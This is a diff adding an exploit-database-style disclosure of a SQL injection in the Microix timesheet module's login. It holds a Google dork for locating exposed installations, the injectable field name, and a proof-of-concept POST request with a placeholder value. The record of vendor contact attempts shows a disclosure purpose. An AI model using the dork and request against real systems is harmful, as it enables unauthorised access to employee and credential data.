@@ -1,0 +1,32 @@
+# Exploit Title: Microix timesheet module SQL Injection
+# Google Dork: "Copyright by Microix" inurl:"/microixcloud/"
+# Date: 2016-09-06
+# Software Link: http://www.microix.net/workflow-modules/timesheet-module/
+# Exploit Author: Anthony Cole
+# Contact: http://twitter.com/acole76
+# Website: http://www.3fforensics.com/
+# CVE: 
+# Category: webapps
+ 
+1. Description
+   
+Microix timeclock is vulnerable to a SQL injection.  The field that is injectable is:
+
+ctl00$ctl00$ASPxCallbackPanel1Root$ASPxSplitter1$Content$ASPxSplitter2$Content2$ASPxRoundPanel1$ASPxCallbackPanel1$txtUserIDOrBadgeID
+
+Initial contact attempt: 08/22/2016
+2nd attempt: 08/29/2016
+3rd attempt: 09/05/2016
+4th attempt: 09/21/2016
+   
+2. Proof of Concept
+
+POST /microixcloud/ HTTP/1.1
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+
+__VIEWSTATE=&ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1%24txtUserIDOrBadgeID=SQLi&ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1%24txtPassword=asdsadsad&__CALLBACKID=ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1&__CALLBACKPARAM=c0%3ALogin
+
+ 
+3. Solution:
+None
